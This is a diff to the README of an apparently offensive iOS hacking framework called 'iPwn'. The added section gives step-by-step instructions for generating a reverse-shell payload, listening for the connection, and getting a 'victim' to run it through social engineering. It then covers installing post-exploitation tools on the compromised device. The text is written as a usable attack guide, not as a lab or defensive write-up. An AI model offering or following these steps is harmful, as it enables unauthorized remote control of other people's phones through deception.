@@ -76,6 +76,25 @@ And as you can see, when we run that module, it shows us the installed default a
 ![image](https://user-images.githubusercontent.com/78043996/119568907-0e649800-bd7c-11eb-9f11-895a0db41a5b.png)
 
 
+The second way to get access to an iOS device. - Reverse shell.
+
+Now, im going to show you have to do it the second way, which is a little more advanced. Keep in mind, I wont include pictures for this part.
+```
+run the iPwn framework by doing 'python main.py'
+type in the 'payload' command
+wait for the payload factory to load.
+select a payload of your choice, Example: use payloads/factory/reverse_bash
+enter your IP
+enter your Port
+then you should get a message that says 'payload generated'
+type in the 'back' command to go back to the main menu
+type in the 'listen' command to start listening for incoming connections
+make sure that your victim runs the script via terminal or throught their own way, try social engineering, be creative!
+once the script is executed on the victims iOS device, you should get a connection
+install the important packages via transferring the 'post.sh' located in /post-exploitation and executing it, or manually do it yourself.
+```
+<!> If you are doing step 2 and get stuck on the part where you have to install the important packages/tools, go into step 1 and copy the guide for installing the packages/tools! <!>
+
 # Tested OS's
 ```
 Windows 10 - Stable
